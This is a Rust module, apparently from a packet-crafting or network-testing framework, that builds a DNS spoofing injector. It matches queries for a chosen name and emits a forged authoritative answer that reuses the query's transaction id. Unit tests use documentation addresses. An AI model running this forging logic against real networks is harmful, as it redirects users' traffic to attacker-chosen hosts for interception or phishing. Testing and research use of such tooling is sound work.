//! DNS flow templates.

use std::net::Ipv4Addr;

use crate::matcher::LayerMatcher;
use crate::{Flow, FlowBuilderExt, FlowError, FlowState, Role, Step, Transition};

/// Initial injector state: watch for the spoofed DNS query.
pub const WATCH: &str = "Watch";

/// DNS query values captured from a matched request.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DnsQuery {
    /// DNS transaction id to reuse in the forged answer.
    pub transaction_id: u16,
    /// First question name in canonical trailing-dot presentation form.
    pub question_name: String,
}

/// Build a DNS spoofing injector flow scaffold.
///
/// Tracked examples and tests should pass an `answer_ip` from `192.0.2.0/24`.
pub fn spoof_flow(spoof_name: &str, answer_ip: Ipv4Addr) -> Flow {
    let watch = FlowState::new(WATCH).on(forged_response_transition(spoof_name, answer_ip));

    Flow::new("dns-spoof")
        .role(Role::Injector)
        .state(watch)
        .initial(WATCH)
}

fn forged_response_transition(spoof_name: &str, answer_ip: Ipv4Addr) -> Transition {
    Transition::on(query_matcher(spoof_name), move |packet, _ctx| {
        let ipv4 = packet.layer::<crafter::Ipv4>().ok_or_else(|| {
            FlowError::Capture("matched DNS query packet has no IPv4 layer".to_string())
        })?;
        let udp = packet.layer::<crafter::Udp>().ok_or_else(|| {
            FlowError::Capture("matched DNS query packet has no UDP layer".to_string())
        })?;
        let dns = packet.layer::<crafter::Dns>().ok_or_else(|| {
            FlowError::Capture("matched DNS query packet has no DNS layer".to_string())
        })?;
        let query = extract_query(dns).ok_or_else(|| {
            FlowError::Capture("matched DNS query did not contain a question".to_string())
        })?;
        let question = dns.questions().first().cloned().ok_or_else(|| {
            FlowError::Capture("matched DNS query did not contain a question".to_string())
        })?;

        Ok(Step::emit(forged_response_packet(
            ipv4.destination(),
            ipv4.source(),
            udp.source_port_value(),
            query.transaction_id,
            question,
            query.question_name,
            answer_ip,
        )))
    })
}

fn forged_response_packet(
    source_ip: Ipv4Addr,
    querier_ip: Ipv4Addr,
    querier_port: u16,
    transaction_id: u16,
    question: crafter::DnsQuestion,
    question_name: String,
    answer_ip: Ipv4Addr,
) -> crafter::Packet {
    crafter::Ipv4::new().src(source_ip).dst(querier_ip)
        / crafter::Udp::new()
            .source_port(crafter::DNS_PORT)
            .destination_port(querier_port)
        / crafter::Dns::new()
            .id(transaction_id)
            .response(true)
            .authoritative(true)
            .question(question)
            .answer(crafter::DnsRecord::a(question_name, answer_ip, 60))
}

/// Match DNS queries whose first question name equals `spoof_name`.
pub fn query_matcher(spoof_name: &str) -> LayerMatcher {
    let spoof_name = canonical_dns_name(spoof_name);

    LayerMatcher::where_layer::<crafter::Dns>("query for spoofed name", move |dns| {
        extract_query(dns)
            .is_some_and(|query| query.question_name.eq_ignore_ascii_case(&spoof_name))
    })
}

/// Extract the transaction id and first question name from a DNS query.
pub fn extract_query(dns: &crafter::Dns) -> Option<DnsQuery> {
    if dns.is_response() {
        return None;
    }

    dns.questions().first().map(|question| DnsQuery {
        transaction_id: dns.id_value(),
        question_name: question.name().to_string(),
    })
}

fn canonical_dns_name(name: &str) -> String {
    crafter::DnsName::parse(name)
        .map(|name| name.presentation().to_string())
        .unwrap_or_else(|_| name.to_string())
}

#[cfg(test)]
mod tests {
    use super::{extract_query, query_matcher, spoof_flow, WATCH};
    use crate::{docaddr, Matcher, PacketContext, Role};

    fn decoded_dns_message(
        dns: crafter::Dns,
        source_port: u16,
        destination_port: u16,
    ) -> crafter::Packet {
        let packet = crafter::Ipv4::new()
            .src(docaddr::CLIENT_IPV4)
            .dst(docaddr::SERVER_IPV4)
            / crafter::Udp::new()
                .source_port(source_port)
                .destination_port(destination_port)
            / dns;
        let compiled = packet.compile().expect("DNS packet should compile");

        crafter::Packet::decode_from_l3(crafter::NetworkLayer::Ipv4, compiled.as_bytes())
            .expect("DNS packet should decode")
    }

    #[test]
    fn dns_spoof_flow_scaffold_has_injector_role_and_initial_watch() {
        let flow = spoof_flow("www.example.test.", docaddr::CLIENT_IPV4);

        assert_eq!(flow.role(), Role::Injector);
        assert_eq!(flow.initial(), WATCH);
        assert!(flow.state(WATCH).is_some());
    }

    #[test]
    fn dns_query_matcher_accepts_spoofed_name_and_extracts_query_values() {
        let transaction_id = 0x4a5b;
        let query = decoded_dns_message(
            crafter::Dns::query("WWW.Example.Test", crafter::DNS_TYPE_A).id(transaction_id),
            53000,
            crafter::DNS_PORT,
        );
        let other_query = decoded_dns_message(
            crafter::Dns::query("other.example.test.", crafter::DNS_TYPE_A).id(transaction_id),
            53001,
            crafter::DNS_PORT,
        );
        let response = decoded_dns_message(
            crafter::Dns::query("www.example.test.", crafter::DNS_TYPE_A)
                .id(transaction_id)
                .response(true),
            crafter::DNS_PORT,
            53000,
        );
        let matcher = query_matcher("www.example.test.");
        let context = PacketContext::new();

        assert!(matcher.matches(&query, &context));
        assert!(!matcher.matches(&other_query, &context));
        assert!(!matcher.matches(&response, &context));

        let dns = query.layer::<crafter::Dns>().expect("query has DNS layer");
        let extracted = extract_query(dns).expect("query values should extract");

        assert_eq!(extracted.transaction_id, transaction_id);
        assert_eq!(extracted.question_name, "WWW.Example.Test.");
    }

    #[test]
    fn dns_spoof_transition_emits_forged_response_echoing_query() {
        let transaction_id = 0x5c6d;
        let answer_ip = docaddr::GATEWAY_IPV4;
        let query = decoded_dns_message(
            crafter::Dns::query("www.example.test.", crafter::DNS_TYPE_A).id(transaction_id),
            53000,
            crafter::DNS_PORT,
        );
        let expected_question = query
            .layer::<crafter::Dns>()
            .expect("query has DNS layer")
            .questions()[0]
            .clone();
        let mut flow = spoof_flow("www.example.test.", answer_ip);
        let mut context = PacketContext::new();

        let step = flow
            .state_mut(WATCH)
            .expect("Watch state exists")
            .find_transition(&query, &context)
            .expect("spoofed query transition matches")
            .fire(&query, &mut context)
            .expect("DNS forged response handler succeeds");
        let response = step.outgoing().expect("transition emits a response");
        let ipv4 = response.layer::<crafter::Ipv4>().expect("response has IPv4");
        let udp = response.layer::<crafter::Udp>().expect("response has UDP");
        let dns = response.layer::<crafter::Dns>().expect("response has DNS");
        let answer = dns.answers().first().expect("response has an answer");

        assert!(!step.expects_reply());
        assert_eq!(step.target(), None);
        assert_eq!(ipv4.source(), docaddr::SERVER_IPV4);
        assert_eq!(ipv4.destination(), docaddr::CLIENT_IPV4);
        assert_eq!(udp.source_port_value(), crafter::DNS_PORT);
        assert_eq!(udp.destination_port_value(), 53000);
        assert!(dns.is_response());
        assert_eq!(dns.id_value(), transaction_id);
        assert_eq!(dns.questions(), std::slice::from_ref(&expected_question));
        assert_eq!(answer.name(), "www.example.test.");
        assert_eq!(answer.record_type(), crafter::DNS_TYPE_A);
        assert_eq!(answer.data(), &crafter::DnsRecordData::A(answer_ip));
    }

    #[test]
    fn dns_echo_forged_response_matches_observed_query_exactly() {
        let transaction_id = 0x6e7f;
        let answer_ip = docaddr::GATEWAY_IPV4;
        let query = decoded_dns_message(
            crafter::Dns::query("www.example.test.", crafter::DNS_TYPE_A).id(transaction_id),
            53123,
            crafter::DNS_PORT,
        );
        let other_query = decoded_dns_message(
            crafter::Dns::query("other.example.test.", crafter::DNS_TYPE_A).id(transaction_id),
            53124,
            crafter::DNS_PORT,
        );
        let query_dns = query.layer::<crafter::Dns>().expect("query has DNS layer");
        let expected_questions = query_dns.questions().to_vec();
        let mut flow = spoof_flow("www.example.test.", answer_ip);
        let mut context = PacketContext::new();

        assert!(flow
            .state_mut(WATCH)
            .expect("Watch state exists")
            .find_transition(&other_query, &context)
            .is_none());

        let step = flow
            .state_mut(WATCH)
            .expect("Watch state exists")
            .find_transition(&query, &context)
            .expect("spoofed query transition matches")
            .fire(&query, &mut context)
            .expect("DNS forged response handler succeeds");
        let response = step.outgoing().expect("transition emits a response");
        let compiled = response.compile().expect("forged response should compile");
        let decoded = crafter::Packet::decode_from_l3(
            crafter::NetworkLayer::Ipv4,
            compiled.as_bytes(),
        )
        .expect("forged response should decode");
        let response_dns = decoded
            .layer::<crafter::Dns>()
            .expect("response has DNS layer");
        let answer = response_dns
            .answers()
            .first()
            .expect("response has an answer");

        assert!(response_dns.is_response());
        assert_eq!(response_dns.id_value(), transaction_id);
        assert_eq!(response_dns.questions(), expected_questions.as_slice());
        assert_eq!(answer.name(), expected_questions[0].name());
        assert_eq!(answer.record_type(), crafter::DNS_TYPE_A);
        assert_eq!(answer.data(), &crafter::DnsRecordData::A(answer_ip));
    }
}
